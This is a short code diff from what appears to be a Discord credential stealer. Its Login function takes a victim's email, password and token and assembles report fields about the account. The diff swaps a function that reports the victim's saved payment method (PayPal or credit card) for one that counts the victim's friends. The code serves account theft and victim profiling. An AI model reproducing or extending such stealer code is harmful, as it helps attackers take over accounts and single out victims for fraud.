@@ -171,24 +171,12 @@ function GetBadges(flags) {
 	return badges
 }
 
-function checkpaymentmethod() {
-	const json = JSON.parse(info3)
-	var billing = "";
-	json.forEach(z => {
-		if (z.type == "") {
-			return "no payment method"
-		} else if (z.type == 2 && z.invalid != !0) {
-			billing += "paypal"
-		} else if (z.type == 1 && z.invalid != !0) {
-			billing += "credit card"
-		} else {
-			return "no payment method"
-		}
-	})
-	if (billing == "") {
-		billing = "no payment method"
-	}
-	return billing
+function intotalfriends() {
+    var f = JSON.parse(info4)
+    const r = f.filter((user) => {
+        return user.type == 1
+    })
+    return r.length
 }
 
 function Login(email, password, token) {
@@ -256,8 +244,8 @@ function Login(email, password, token) {
                             "inline": false
                         }, 
                         {
-                            "name": " payment method",
-                            "value": `\`${checkpaymentmethod()}\``,
+                            "name": " intotal friends",
+                            "value": `\`${intotalfriends()}\``,
                             "inline": true		    
                         },
                         {
